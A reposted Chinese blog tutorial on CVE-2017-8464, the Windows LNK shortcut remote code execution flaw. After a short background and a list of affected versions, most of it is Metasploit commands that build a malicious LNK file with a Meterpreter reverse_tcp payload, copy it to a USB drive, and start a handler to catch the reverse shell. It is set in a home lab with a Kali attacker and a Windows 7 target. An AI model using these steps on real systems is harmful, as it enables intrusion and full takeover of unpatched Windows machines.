# (CVE-2017-8464）LNK文件远程代码执行 - 暮日温柔 - 博客园

> 原文：[https://www.cnblogs.com/daiorz/p/12022935.html](https://www.cnblogs.com/daiorz/p/12022935.html)

**漏洞详细**

北京时间2017年6月13日凌晨，微软官方发布6月安全补丁程序，“震网三代” LNK文件远程代码执行漏洞（CVE-2017-8464）和Windows搜索远程命令执行漏洞（CVE-2017-8543）.

CVE-2017-8543，当Windows搜索处理内存中的对象时，存在远程执行代码漏洞。成功利用此漏洞的攻击者可以控制受影响的系统。

CVE-2017-8464，当Windows系统在解析快捷方式时，存在远程执行任意代码的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危。

攻击机：kali
IP地址为：192.168.0.188
靶机：win7
IP地址：192.168.0.193

### **受影响的版本**

```
Windows 7
Windows 8.1
Windows RT 8.1
Windows 10
Windows Server 2008
Windows Server 2008 R2
Windows Server 2012
Windows Server 2012 R2
Windows Server 2016
```

**漏洞实现**

```
msfconsole
search 2017_8464
use exploit/windows/fileformat/cve_2017_8464_lnk_rce
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.118(你的IP)
exploit

![](../Images/b59684e00341bc96c77cd2db5183323e.png)
```

```
 之后会在/root/.msf4/local目录下生成我们的利用文件

注意：kali2.0下无法直接访问该文件夹，可通过命令行将/root/.msf4/local/下的所有文件复制到/root/1下 
```

```
`cp -r /root/.msf4/local/ /root/1` 
```

```
 ![](../Images/067e93993b261e29309f4ec2ac428e64.png)
```

全部复制到移动磁盘里面(u盘拷贝)
然后在msf中监听

```
search multi/handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.10.118 (你的IP地址)
run 
```

```
 ![](../Images/e2443195aba6df51ee624e36c571e8d7.png)
```